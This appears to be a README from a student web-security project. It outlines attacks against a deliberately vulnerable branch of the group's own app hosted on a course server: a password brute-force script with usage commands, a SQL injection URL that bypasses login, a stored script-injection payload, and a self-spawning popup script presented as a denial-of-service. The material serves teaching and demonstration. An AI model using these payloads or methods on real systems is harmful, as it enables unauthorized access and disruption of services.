## Vulnerability Outline
**To exploit the vulnerabilities outlined below, utilize the secret-keeper-not-secure branch**

### Brute-Force Attack
**brutePass.sh**
* BrutePass takes advantage of the PUT login to test username and password combos
* Usernames are provided by the script user
* Passwords are taken from passwords.txt which has the 10000 top passwords

**Directions to use brutePass.sh:**
1. Place brutePass.sh and passwords.txt in the same directory
2. Open a connection to osu servers (do not use flip3, or the same server as the site is hosted if not flip3)
3. Open the directory with brutePass.sh
4. You may need to give yourself permission to run the script: chmod 777 brutePass.sh

**To use the script:** ./brutePass.sh -g username URL

**Examples:**
* ./brutePass.sh -g Kyle flip3.engr.oregonstate.edu:6061
* ./brutePass.sh -g Katie flip3.engr.oregonstate.edu:6061
* ./brutePass.sh -g Admin flip3.engr.oregonstate.edu:6061


### SQL Injection Attack
**HTML SQL Injection:**
* SQL code can be inserted into the URL as placeholders are not used for MySQL credential checks
* Use the following URL to access users' information without their credentials
* flip3.engr.oregonstate.edu:6061/user/'\*'%20OR%20ALL&'\*'%20OR%20ALL

### HTML Injection Attack
**To inject a script:**
1. Sign into any existing user account
2. Add a new record, using the following as the value for one field in the form: 
>"&amp;gt;<script>alert("Warning: This site is vulnerable to an attack")</script>
3. Note the popup alert warning of possible attack

### Distributed Denial of Service (DDoS) Attack
**Fork Bomb:**
1. Make sure that the broswer with the site open will not block popups
2. Add a new record, using the following as the value for the record name:
>"&amp;gt;<script>
function fork() {
  	const win = window.open("http://flip3.engr.oregonstate.edu:6060/user/Kyle&12345");
	setTimeout(fork(), 1);
}
fork(); </script>
3. Select the name of the record (the code) from the record table
NOTE: This does not bring down the school server (thankfully) rather it illustrates how to slow down a weak server
